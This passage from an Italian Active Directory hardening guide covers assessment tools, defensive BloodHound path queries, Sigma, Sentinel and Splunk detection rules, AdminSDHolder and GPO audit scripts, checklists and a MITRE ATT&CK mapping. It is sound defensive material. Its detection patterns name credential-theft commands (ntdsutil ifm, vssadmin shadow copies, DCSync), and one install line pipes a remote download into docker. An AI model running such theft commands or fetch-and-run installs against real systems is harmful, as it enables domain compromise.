# Verificare l'integrità del backup
wbadmin get versions -backupTarget:E:

# === FOREST RECOVERY PROCEDURE (SINTESI) ===
# Riferimento: Microsoft "Active Directory Forest Recovery Guide"
#
# 1. Isolare la rete (disconnettere tutti i DC)
# 2. Ripristinare il primo DC dal backup più recente pulito
# 3. Eseguire un authoritative restore di SYSVOL
# 4. Seize dei FSMO roles sul DC ripristinato
# 5. Ripristinare i DC rimanenti (clean install + replicazione)
# 6. Rotazione krbtgt (2 volte con intervallo 12-24h)
# 7. Reset di TUTTE le password (inclusi account macchina)
# 8. Revocare tutti i certificati emessi nel periodo sospetto
# 9. Audit completo ACL, GPO, e delegation
# 10. Monitoraggio intensivo per 90 giorni post-recovery
```

---

## 17. Strumenti di Security Assessment Avanzati

### 17.1 PingCastle — Valutazione Automatizzata della Sicurezza AD

PingCastle è uno strumento di assessment che analizza la configurazione AD e produce un punteggio di rischio basato su molteplici categorie: stale objects, privileged accounts, trust configuration, e anomalies.

```powershell
# === UTILIZZO PINGCASTLE ===

# Eseguire un healthcheck completo
.\PingCastle.exe --healthcheck --server dc01.domain.local

# Output: ad_hc_domain.local.html
# Contiene:
# - Score complessivo (0-100, più basso = più sicuro)
# - Dettaglio per categoria (Stale Objects, Privileged Accounts, Trusts, Anomalies)
# - Lista di findings con priorità e remediation

# Scansione di tutti i domini nella foresta
.\PingCastle.exe --healthcheck --server dc01.domain.local --explore-trust

# Confrontare report nel tempo per misurare i progressi
.\PingCastle.exe --healthcheck --server dc01.domain.local --previous-report ad_hc_domain.local_previous.xml

# Categorie di punteggio PingCastle:
# ┌─────────────────────┬────────────────────────────────┐
# │ Stale Objects       │ Account disabilitati, computer │
# │                     │ inattivi, password non cambiate│
# ├─────────────────────┼────────────────────────────────┤
# │ Privileged Accounts │ Admin eccessivi, Protected     │
# │                     │ Users non utilizzato, gMSA     │
# ├─────────────────────┼────────────────────────────────┤
# │ Trusts              │ Trust insicuri, SID filtering  │
# │                     │ non attivo, trust obsoleti     │
# ├─────────────────────┼────────────────────────────────┤
# │ Anomalies           │ GPO misconfigured, schema      │
# │                     │ extensions sospette, KRBTGT    │
# │                     │ password age                   │
# └─────────────────────┴────────────────────────────────┘
```

### 17.2 Purple Knight — Indicatori di Esposizione e Compromissione

Purple Knight (Semperis) esegue oltre 150 test suddivisi in IOE (Indicators of Exposure) e IOC (Indicators of Compromise), coprendo le categorie MITRE ATT&CK.

```
# Esecuzione Purple Knight:
# 1. Scaricare da semperis.com/purple-knight
# 2. Eseguire come Domain Admin (o account con read-access completo)
# 3. Selezionare i domini da analizzare
# 4. Attendere l'analisi (10-30 minuti a seconda delle dimensioni)

# Categorie di test Purple Knight:
# ├── Account Security
# │   ├── Accounts con password che non scadono
# │   ├── Accounts senza pre-authentication Kerberos
# │   ├── Service accounts con SPN e password deboli
# │   └── Accounts in Protected Users group
# ├── AD Infrastructure
# │   ├── DC con Print Spooler attivo
# │   ├── LDAP signing non enforced
# │   ├── SMB signing non required
# │   └── NTLM authentication consentita
# ├── Group Policy Security
# │   ├── GPO con permessi di modifica eccessivi
# │   ├── GPO che impostano password in chiaro (cpassword)
# │   └── GPO linkate a OU sensibili con ACL deboli
# ├── Kerberos Security
# │   ├── RC4 encryption consentita
# │   ├── Unconstrained delegation attiva
# │   └── krbtgt password age
# └── AD Delegation
#     ├── ACL con GenericAll/GenericWrite su oggetti sensibili
#     ├── DCSync rights per account non-DC
#     └── Shadow Admins (privilege escalation path indiretti)
```

### 17.3 BloodHound CE — Uso Difensivo

BloodHound Community Edition (CE) è la versione moderna dell'originale BloodHound, basata su PostgreSQL invece di Neo4j. Per un uso difensivo, l'obiettivo è identificare e rimuovere gli attack path prima che un attaccante li scopra.

```bash
# === INSTALLAZIONE BLOODHOUND CE ===
# Docker-based deployment
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Accesso web: http://localhost:8080
# Default credentials: admin / (generata al primo avvio)

# === COLLECTION CON SHARPHOUND (Windows) ===
# SharpHound.exe -c All --outputdirectory C:\BH --zipfilename collection.zip

# === COLLECTION CON BLOODHOUND-PYTHON (Linux) ===
bloodhound-python -u admin -p password -d domain.local -ns 10.0.0.1 \
    -c All --zip -o ./bh_data/
```

**Query Cypher difensive essenziali per BloodHound CE:**

```cypher
// 1. Trovare TUTTI i path verso Domain Admins
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE u<>g
RETURN p LIMIT 50

// 2. Trovare account con DCSync rights (non-DC)
MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain)
WHERE NOT u.name CONTAINS "DC" AND NOT u:Computer
RETURN u.name, d.name

// 3. Computer con unconstrained delegation (esclusi DC)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name, c.operatingsystem

// 4. Utenti kerberoastable con path verso high-value targets
MATCH (u:User {hasspn:true}),(t {highvalue:true})
MATCH p=shortestPath((u)-[*1..]->(t))
RETURN u.name, t.name, length(p) as pathLength
ORDER BY pathLength

// 5. Account con password mai cambiata (> 365 giorni)
MATCH (u:User)
WHERE u.pwdlastset < (datetime().epochSeconds - 31536000)
AND u.enabled = true
RETURN u.name, datetime({epochSeconds: toInteger(u.pwdlastset)}) as lastPwdChange
ORDER BY u.pwdlastset

// 6. Shortest path da qualsiasi utente a qualsiasi Tier 0 asset
MATCH (u:User {enabled:true}),(t {highvalue:true})
MATCH p=shortestPath((u)-[*1..]->(t))
WHERE length(p) <= 3
RETURN u.name, t.name, length(p) as hops
ORDER BY hops

// 7. Identificare Shadow Admins (utenti con path indiretti verso DA)
MATCH p=shortestPath((u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|
    ForceChangePassword|AddMember|Owns*1..3]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE NOT u.name CONTAINS "ADMIN"
RETURN u.name, [rel in relationships(p) | type(rel)] as attackPath
```

---

## 18. Regole di Detection SIEM Avanzate

### 18.1 Regole Sigma per Attacchi AD Moderni

Le regole Sigma forniscono logica di detection indipendente dal vendor SIEM, convertibile in query native per Splunk (SPL), Elastic (KQL/EQL), Microsoft Sentinel (KQL), QRadar (AQL), e oltre 40 piattaforme.

```yaml
# === Sigma Rule: Coercion Attack Detection ===
title: Windows Authentication Coercion via Named Pipes
id: 7a2c4e59-3b8d-4f1a-9c2e-5d6f8a4b7c3e
status: stable
description: |
    Rileva connessioni sospette a named pipes utilizzate per attacchi di coercion
    (PrinterBug, PetitPotam, DFSCoerce, ShadowCoerce)
logsource:
    product: windows
    service: security
detection:
    selection_pipes:
        EventID: 5145  # Network Share Object Access
        ShareName|endswith:
            - '\IPC$'
        RelativeTargetName|contains:
            - 'spoolss'
            - 'efsrpc'
            - 'lsarpc'
            - 'netdfs'
            - 'FssagentRpc'
    filter_legitimate:
        SubjectUserName|endswith: '$'
        IpAddress|startswith:
            - '10.0.0.'  # Subnet dei DC (adattare)
    condition: selection_pipes and not filter_legitimate
level: high
tags:
    - attack.credential_access
    - attack.t1187
    - attack.t1557
falsepositives:
    - Operazioni di stampa legittime (spoolss)
    - Operazioni DFS legittime (netdfs)
    - Operazioni EFS legittime (efsrpc)
```

```yaml
# === Sigma Rule: RBCD Attack Detection ===
title: Resource-Based Constrained Delegation Modification
id: 8b3d5f6a-4c9e-4a2b-8d1f-6e7c9a5b3d2e
status: stable
description: |
    Rileva la modifica dell'attributo msDS-AllowedToActOnBehalfOfOtherIdentity
    che indica un potenziale attacco RBCD
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
    condition: selection
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1134.001
    - attack.t1550.003
```

```yaml
# === Sigma Rule: Machine Account Quota Abuse ===
title: Suspicious Machine Account Creation by Non-Admin
id: 9c4e6a7b-5d8f-4b3c-9e2a-7f8d1c6b4a3e
status: stable
description: |
    Rileva la creazione di account macchina da parte di utenti non privilegiati,
    potenzialmente per attacchi RBCD
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4741  # Computer account created
    filter_admin:
        SubjectUserName|endswith: '$'
    filter_known_admins:
        SubjectUserName:
            - 'Administrator'
            - 'SYSTEM'
    condition: selection and not filter_admin and not filter_known_admins
level: high
tags:
    - attack.persistence
    - attack.t1136.002
```

```yaml
# === Sigma Rule: AdminSDHolder Modification ===
title: AdminSDHolder Object Modification
id: 1d5f7b8c-6e9a-4c3d-8f2b-9a4c7e6d5b3f
status: stable
description: |
    Rileva modifiche all'oggetto AdminSDHolder, potenziale meccanismo
    di persistenza per mantenere privilegi elevati
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        ObjectDN|contains: 'CN=AdminSDHolder,CN=System'
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1078.002
falsepositives:
    - Modifiche amministrative legittime (rare e pianificate)
```

```yaml
# === Sigma Rule: NTDS.DIT Access / Extraction ===
title: NTDS.DIT File Access or Shadow Copy for Extraction
id: 2e6a8c9d-7f1b-4d4e-9a3c-8b5d6f7e4a2c
status: stable
description: |
    Rileva tentativi di accesso o estrazione del file NTDS.DIT
    tramite ntdsutil, vssadmin, o copia diretta
logsource:
    product: windows
    service: security
detection:
    selection_process:
        EventID: 4688
        NewProcessName|endswith:
            - '\ntdsutil.exe'
            - '\vssadmin.exe'
        CommandLine|contains:
            - 'ifm'
            - 'create full'
            - 'create shadow'
            - 'ntds'
    selection_file_access:
        EventID: 4663
        ObjectName|contains: 'ntds.dit'
    condition: selection_process or selection_file_access
level: critical
tags:
    - attack.credential_access
    - attack.t1003.003
```

### 18.2 Query di Detection per Microsoft Sentinel

```kusto
// === MICROSOFT SENTINEL — QUERY DI DETECTION AD ===

// 1. Kerberoasting — Volume anomalo di richieste TGS con RC4
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| where ServiceName != "krbtgt"
| summarize RequestCount = count(), DistinctSPNs = dcount(ServiceName),
    SPNList = make_set(ServiceName, 20) by TargetAccount, IpAddress,
    bin(TimeGenerated, 5m)
| where RequestCount > 5 or DistinctSPNs > 3
| extend AlertSeverity = case(
    DistinctSPNs > 10, "Critical",
    DistinctSPNs > 5, "High",
    "Medium"
)

// 2. Password Spraying — Molti account, pochi tentativi ciascuno
SecurityEvent
| where EventID in (4771, 4625)
| where TimeGenerated > ago(30m)
| summarize FailedAttempts = count(),
    DistinctAccounts = dcount(TargetAccount),
    AccountList = make_set(TargetAccount, 50) by IpAddress
| where DistinctAccounts > 15 and FailedAttempts > 20
| extend AlertSeverity = case(
    DistinctAccounts > 50, "Critical",
    DistinctAccounts > 25, "High",
    "Medium"
)

// 3. Golden Ticket — TGT con lifetime anomalo
SecurityEvent
| where EventID == 4768
| extend TicketOptions = tostring(TicketOptions)
| where TicketOptions contains "0x40810010"  // Forwardable + Renewable + Canonicalize
| summarize count() by TargetAccount, IpAddress, TicketOptions,
    bin(TimeGenerated, 1h)
// Correlare con assenza di AS-REQ precedente dall'IP sorgente

// 4. Honey Account — Qualsiasi autenticazione è sospetta
let HoneyAccounts = dynamic(["svc_backup_admin", "admin_legacy", "sql_migration"]);
SecurityEvent
| where EventID in (4624, 4625, 4768, 4769, 4776)
| where TargetAccount in (HoneyAccounts) or TargetUserName in (HoneyAccounts)
| project TimeGenerated, EventID, TargetAccount, IpAddress, LogonType,
    WorkstationName, Activity
// ALERT: Qualsiasi risultato indica attività di attaccante attivo

// 5. DCSync da non-DC
SecurityEvent
| where EventID == 4662
| where Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    or Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !endswith "$"
| project TimeGenerated, SubjectAccount, SubjectUserName,
    Properties, ObjectServer

// 6. Nuovi servizi sospetti (PsExec, lateral movement)
SecurityEvent
| where EventID == 7045
| where ServiceName matches regex @"^[a-zA-Z]{8}$"  // Nomi random 8 char
    or ImagePath contains @"\ADMIN$\"
    or ImagePath contains @"\C$\Windows\Temp\"
    or ImagePath contains "cmd.exe"
    or ImagePath contains "powershell"
| project TimeGenerated, ServiceName, ImagePath, ServiceAccount, Computer
```

### 18.3 Query di Detection per Splunk

```spl
// === SPLUNK — DETECTION QUERIES AD ===

// 1. DCSync Detection
index=wineventlog sourcetype=WinEventLog:Security EventCode=4662
| where match(Properties, "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
    OR match(Properties, "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
| where NOT match(SubjectUserName, "\$$")
| table _time, SubjectUserName, SubjectDomainName, ObjectServer, Properties
| sort -_time

// 2. Kerberoasting Volume Detection
index=wineventlog sourcetype=WinEventLog:Security EventCode=4769
    TicketEncryptionType=0x17
    NOT ServiceName=krbtgt
    NOT ServiceName="*$"
| bucket _time span=5m
| stats count as request_count, dc(ServiceName) as unique_spns,
    values(ServiceName) as targeted_spns by src_ip, TargetUserName, _time
| where request_count > 5 OR unique_spns > 3

// 3. Password Spray Detection
index=wineventlog sourcetype=WinEventLog:Security
    (EventCode=4771 OR EventCode=4625)
| bucket _time span=30m
| stats count as failures, dc(TargetUserName) as unique_accounts,
    values(TargetUserName) as accounts by src_ip, _time
| where unique_accounts > 15 AND failures > 20

// 4. Shadow Credentials Attack
index=wineventlog sourcetype=WinEventLog:Security EventCode=5136
    AttributeLDAPDisplayName="msDS-KeyCredentialLink"
| table _time, SubjectUserName, ObjectDN, AttributeValue
| sort -_time
```

---

## 19. Hardening AdminSDHolder e Prevenzione Persistenza AD

### 19.1 Meccanismo AdminSDHolder e Abuso per Persistenza

AdminSDHolder è un container speciale in Active Directory (`CN=AdminSDHolder,CN=System,DC=domain,DC=local`) il cui ACL viene automaticamente propagato a tutti gli account e gruppi "protetti" ogni 60 minuti dal processo SDProp (Security Descriptor Propagator). Gli account protetti includono Domain Admins, Enterprise Admins, Schema Admins, Administrators, e altri gruppi ad alto privilegio.

Un attaccante con Domain Admin può inserire ACE (Access Control Entry) nell'ACL di AdminSDHolder che verranno propagate a tutti i gruppi privilegiati, garantendo persistenza anche se le ACL vengono corrette manualmente sugli oggetti target.

```powershell
# === AUDIT E HARDENING ADMINSDHOLDER ===

# 1. Esaminare l'ACL attuale di AdminSDHolder
$adminSDHolderDN = "CN=AdminSDHolder,CN=System,$((Get-ADDomain).DistinguishedName)"
$acl = Get-Acl "AD:\$adminSDHolderDN"

Write-Host "=== ACL AdminSDHolder ===" -ForegroundColor Cyan
$acl.Access | Where-Object {
    $_.IdentityReference -notmatch "^(NT AUTHORITY|BUILTIN|S-1-5|DOMAIN\\Domain Admins|DOMAIN\\Enterprise Admins|DOMAIN\\Administrators)" -and
    $_.IdentityReference -notmatch "\\Administrator$"
} | ForEach-Object {
    Write-Warning "ACE SOSPETTO in AdminSDHolder: $($_.IdentityReference) → $($_.ActiveDirectoryRights)"
}

# 2. Verificare che il timer SDProp non sia stato modificato
# Il valore default di AdminSDProtectFrequency è 60 minuti
$sdpropFreq = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
    -Name "AdminSDProtectFrequency" -ErrorAction SilentlyContinue).AdminSDProtectFrequency
if ($sdpropFreq -and $sdpropFreq -ne 60) {
    Write-Warning "SDProp frequency modificata: $sdpropFreq minuti (default: 60)"
}

# 3. Trovare tutti gli account con AdminCount = 1
# Questi account sono sotto il controllo di AdminSDHolder
$adminCountUsers = Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount, MemberOf
Write-Host "`n[+] Account con AdminCount = 1: $($adminCountUsers.Count)" -ForegroundColor Yellow
$adminCountUsers | Select-Object SamAccountName, Enabled,
    @{N='Groups';E={(Get-ADPrincipalGroupMembership $_.SamAccountName | Select-Object -ExpandProperty Name) -join ", "}} |
    Format-Table -AutoSize

# 4. Identificare account "orfani" con AdminCount=1 che NON sono più in gruppi protetti
# Questi account mantengono l'ACL restrittiva di AdminSDHolder anche dopo la rimozione dal gruppo
$protectedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins",
    "Administrators", "Account Operators", "Server Operators",
    "Backup Operators", "Print Operators", "Replicator")

foreach ($user in $adminCountUsers) {
    $groups = Get-ADPrincipalGroupMembership $user.SamAccountName |
        Select-Object -ExpandProperty Name
    $inProtectedGroup = $false
    foreach ($pg in $protectedGroups) {
        if ($groups -contains $pg) { $inProtectedGroup = $true; break }
    }
    if (-not $inProtectedGroup) {
        Write-Warning "Account ORFANO con AdminCount=1: $($user.SamAccountName) — non è in nessun gruppo protetto"
        # Remediation: reimpostare AdminCount a 0 e ripristinare l'ereditarietà ACL
        # Set-ADUser -Identity $user.SamAccountName -Replace @{AdminCount = 0}
        # Poi abilitare l'ereditarietà ACL sull'oggetto
    }
}
```

### 19.2 Protezione GPO contro Modifiche Malevole

Le Group Policy Objects (GPO) rappresentano un vettore di distribuzione devastante per il ransomware e la persistenza. Un attaccante con permessi di modifica su una GPO linkata alla OU dei Domain Controllers o alla OU delle workstation può eseguire codice arbitrario su tutti i sistemi nell'ambito della GPO.

```powershell
# === AUDIT PERMESSI GPO ===

# 1. Trovare GPO con permessi di modifica eccessivi
Import-Module GroupPolicy
$gpos = Get-GPO -All

foreach ($gpo in $gpos) {
    $perms = Get-GPPermission -Guid $gpo.Id -All
    $dangerousPerms = $perms | Where-Object {
        $_.Permission -match "GpoEdit|GpoEditDeleteModifySecurity" -and
        $_.Trustee.Name -notmatch "^(Domain Admins|Enterprise Admins|SYSTEM|Administrators)$"
    }
    if ($dangerousPerms) {
        Write-Warning "GPO '$($gpo.DisplayName)' ha permessi di modifica per:"
        $dangerousPerms | ForEach-Object {
            Write-Host "  - $($_.Trustee.Name): $($_.Permission)" -ForegroundColor Red
        }
    }
}

# 2. Verificare GPO linkate a OU sensibili (Domain Controllers, Tier 0)
$dcOU = (Get-ADDomain).DomainControllersContainer
$linkedGPOs = (Get-ADOrganizationalUnit -Identity $dcOU -Properties LinkedGroupPolicyObjects).LinkedGroupPolicyObjects
Write-Host "`nGPO linkate alla OU Domain Controllers:" -ForegroundColor Cyan
foreach ($gpoLink in $linkedGPOs) {
    $gpoGuid = [regex]::Match($gpoLink, '\{(.+?)\}').Groups[1].Value
    $gpo = Get-GPO -Guid $gpoGuid -ErrorAction SilentlyContinue
    Write-Host "  - $($gpo.DisplayName) (ID: $gpoGuid)"
}

# 3. Monitorare modifiche GPO (Event ID 5136 per attributi gPCFileSysPath, gPCMachineExtensionNames)
# Configurare audit su:
# CN=Policies,CN=System,DC=domain,DC=local
# Event ID 5136 con ObjectClass=groupPolicyContainer
```

---

## 20. Checklist Operativa di Sicurezza AD — 2025-2026

### 20.1 Checklist Immediata (Priorità Critica — Settimana 1-2)

```
□ CREDENZIALI E ACCESSO
  □ Verificare membri di Domain Admins, Enterprise Admins, Schema Admins
    → Rimuovere account non necessari
  □ Verificare che nessun account di servizio sia in Domain Admins
  □ Implementare Protected Users per tutti gli admin Tier 0
  □ Verificare password age di krbtgt (rotare se > 180 giorni)
  □ Disabilitare account con DONT_REQUIRE_PREAUTH
  □ Impostare MachineAccountQuota = 0

□ SERVIZI SUI DC
  □ Disabilitare Print Spooler su TUTTI i DC
  □ Disabilitare File Server VSS Agent Service sui DC
  □ Verificare che WebClient service sia disabilitato sui DC
  □ Verificare Secure Boot attivo sui DC fisici

□ PROTOCOLLI
  □ Richiedere SMB Signing su tutti i DC
  □ Richiedere LDAP Signing sui DC
  □ Abilitare LDAP Channel Binding = Always
  □ Disabilitare LLMNR e NBT-NS in tutto il dominio

□ MONITORAGGIO
  □ Abilitare audit avanzato (Directory Service Access, Kerberos ops, Logon)
  □ Configurare alerting per Event ID 4662 (DCSync)
  □ Configurare alerting per Event ID 7045 (nuovi servizi sospetti)
  □ Creare almeno un honey account con alert attivo
```

### 20.2 Checklist a Medio Termine (Priorità Alta — Mese 1-3)

```
□ ARCHITETTURA TIERED
  □ Creare OU separate per Tier 0, Tier 1, Tier 2
  □ Creare account admin separati per ogni tier
  □ GPO "Deny logon" per Tier 0 accounts su sistemi Tier 1/2
  □ Iniziare il deployment di PAW per Tier 0

□ KERBEROS HARDENING
  □ Audit completo utilizzo RC4 (Event ID 4769 con tipo 0x17)
  □ Impostare msDS-SupportedEncryptionTypes = 0x18 per tutti i service account
  □ Pianificare disabilitazione RC4 prima di Luglio 2026
  □ Abilitare FAST Armoring (se DFL >= 2012)

□ ACCOUNT DI SERVIZIO
  □ Inventario completo account con SPN
  □ Migrare service account a gMSA dove possibile
  □ Password 30+ caratteri per service account che non possono usare gMSA
  □ Rimuovere SPN non più necessari

□ LAPS
  □ Deployare Windows LAPS su tutte le workstation
  □ Configurare password di 20+ caratteri, rotazione 30 giorni
  □ Verificare permessi di lettura password LAPS (solo gruppi autorizzati)

□ ADCS
  □ Eseguire certipy find -vulnerable
  □ Correggere ESC1 (rimuovere CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
  □ Correggere ESC6 (rimuovere EDITF_ATTRIBUTESUBJECTALTNAME2)
  □ Correggere ESC8 (abilitare EPA su enrollment web)
  □ Abilitare auditing completo sul CA (AuditFilter = 127)
  □ Forzare StrongCertificateBindingEnforcement = 2

□ BACKUP E DR
  □ Backup System State giornaliero dei DC
  □ Almeno un backup offline/air-gapped
  □ Test di ripristino DC da backup (trimestrale)
  □ Documentare procedura di forest recovery
```

### 20.3 Checklist a Lungo Termine (Priorità Media — Mese 3-12)

```
□ NTLM PHASE-OUT
  □ Abilitare audit NTLM (fase 1)
  □ Identificare e documentare tutte le dipendenze NTLM
  □ Creare exceptions per applicazioni legacy
  □ Disabilitare NTLM (fase 3) su sistemi pronti

□ ENTERPRISE ACCESS MODEL
  □ Implementare Authentication Policies e Silos per Tier 0
  □ Deployare Credential Guard su tutti i sistemi supportati
  □ Implementare JIT access (PIM o soluzione PAM)
  □ Configurare JEA per task amministrativi comuni

□ CONTINUOUS ASSESSMENT
  □ BloodHound/SharpHound collection settimanale automatica
  □ PingCastle healthcheck mensile con tracking del punteggio
  □ Audit ACL trimestrale su oggetti sensibili
  □ Penetration test AD annuale (interno o esterno)
  □ Revisione trust relationships semestrale

□ MONITORING AVANZATO
  □ Implementare Defender for Identity (o equivalente)
  □ Integrare log AD con SIEM centralizzato
  □ Configurare regole Sigma per tutti gli attacchi AD noti
  □ Monitorare creazione/modifica di nTDSDSA objects (DCShadow)
  □ Monitorare modifiche a AdminSDHolder
  □ Monitorare modifiche a attributi DPAPI-related
```

---

## Appendice E — Mappatura MITRE ATT&CK per Attacchi AD

| Tecnica MITRE | ID | Attacchi AD Correlati | Detection Event IDs |
|--------------|-----|----------------------|-------------------|
| OS Credential Dumping: NTDS | T1003.003 | DCSync, NTDS.DIT extraction, Volume Shadow Copy | 4662, 4688 (ntdsutil/vssadmin) |
| OS Credential Dumping: LSA Secrets | T1003.004 | DPAPI Backup Key extraction, LSA secret dumping | 4662, 4688 |
| OS Credential Dumping: LSASS Memory | T1003.001 | Mimikatz sekurlsa, LSASS dump | 4688, Sysmon 10 |
| Steal or Forge Kerberos: Golden Ticket | T1558.001 | Golden Ticket, Diamond Ticket | 4768 (anomaly) |
| Steal or Forge Kerberos: Silver Ticket | T1558.002 | Silver Ticket | Service-specific (no DC event) |
| Steal or Forge Kerberos: Kerberoasting | T1558.003 | Kerberoasting | 4769 (RC4 type) |
| Steal or Forge Kerberos: AS-REP Roasting | T1558.004 | AS-REP Roasting | 4768 (no pre-auth) |
| Use Alternate Auth Material: PtH | T1550.002 | Pass-the-Hash | 4624 (Type 3 + NTLM) |
| Use Alternate Auth Material: PtT | T1550.003 | Pass-the-Ticket, RBCD | 4624 (Kerberos), 5136 |
| Forced Authentication | T1187 | PrinterBug, PetitPotam, DFSCoerce, ShadowCoerce | 5145 (named pipe access) |
| Adversary-in-the-Middle: NTLM Relay | T1557.001 | NTLM Relay to SMB/LDAP/ADCS | 4624 (source mismatch) |
| Rogue Domain Controller | T1207 | DCShadow | 4742, DNS SRV changes |
| Modify Auth Process: LSASS Driver | T1556.001 | Skeleton Key | 7045, Defender for Identity |
| Account Manipulation: Device Registration | T1098.005 | Shadow Credentials | 5136 (KeyCredentialLink) |
| Domain Policy Modification: GPO | T1484.001 | GPO abuse, ransomware via GPO | 5136 (groupPolicyContainer) |
| Account Discovery: Domain Account | T1087.002 | BloodHound/SharpHound enumeration | 4662 (bulk reads), 4799 |
| Permission Groups Discovery | T1069.002 | AD group enumeration | 4799 |
| Forge Web Credentials: SAML | T1606.002 | Golden SAML via ADFS compromise | ADFS event logs |

---

## Appendice F — Glossario Tecnico AD Security

| Termine | Definizione |
|---------|------------|
| **ACE** | Access Control Entry — singola regola di permesso in un ACL |
| **ACL** | Access Control List — lista di permessi su un oggetto AD |
| **ADCS** | Active Directory Certificate Services — infrastruttura PKI integrata in AD |
| **AdminSDHolder** | Container AD la cui ACL viene propagata a tutti i gruppi protetti ogni 60 minuti |
| **AS-REP** | Authentication Service Reply — risposta del KDC alla richiesta iniziale di autenticazione |
| **AS-REQ** | Authentication Service Request — richiesta iniziale di autenticazione Kerberos |
| **DACL** | Discretionary Access Control List — definisce chi può accedere a un oggetto |
| **DCSync** | Attacco che simula la replica DC per estrarre hash delle password |
| **DPAPI** | Data Protection Application Programming Interface — API Windows per protezione dati |
| **DSRM** | Directory Services Restore Mode — modalità di avvio DC per ripristino |
| **EAM** | Enterprise Access Model — evoluzione del tiered model per ambienti ibridi |
| **EPA** | Extended Protection for Authentication — protezione contro relay attacks |
| **FAST** | Flexible Authentication Secure Tunneling — armoring per pre-auth Kerberos |
| **FSMO** | Flexible Single Master Operations — ruoli operativi AD a master singolo |
| **gMSA** | Group Managed Service Account — account di servizio con password gestita da AD |
| **GPO** | Group Policy Object — oggetto di policy per configurazione centralizzata |
| **IOC** | Indicator of Compromise — indicatore di avvenuta compromissione |
| **IOE** | Indicator of Exposure — indicatore di esposizione a rischio |
| **JEA** | Just-Enough-Administration — endpoint PowerShell con comandi limitati |
| **JIT** | Just-in-Time — accesso privilegiato temporaneo su richiesta |
| **KDC** | Key Distribution Center — servizio Kerberos sul DC |
| **LAPS** | Local Administrator Password Solution — gestione password admin locali |
| **NTDS.DIT** | Database AD che contiene tutti gli oggetti e le credenziali del dominio |
| **PAC** | Privilege Attribute Certificate — struttura nel ticket Kerberos con info sui gruppi |
| **PAW** | Privileged Access Workstation — workstation dedicata all'amministrazione sicura |
| **PIM** | Privileged Identity Management — servizio Entra ID per accesso privilegiato JIT |
| **PKINIT** | Public Key Initial Authentication — autenticazione Kerberos tramite certificato |
| **RBCD** | Resource-Based Constrained Delegation — delega configurata sull'oggetto target |
| **SPN** | Service Principal Name — identificatore univoco di un servizio in AD per Kerberos |
| **TGS** | Ticket Granting Service — ticket Kerberos per accesso a uno specifico servizio |
| **TGT** | Ticket Granting Ticket — ticket Kerberos master per richiedere TGS |
| **VBS** | Virtualization-Based Security — isolamento basato su hypervisor per protezione credenziali |
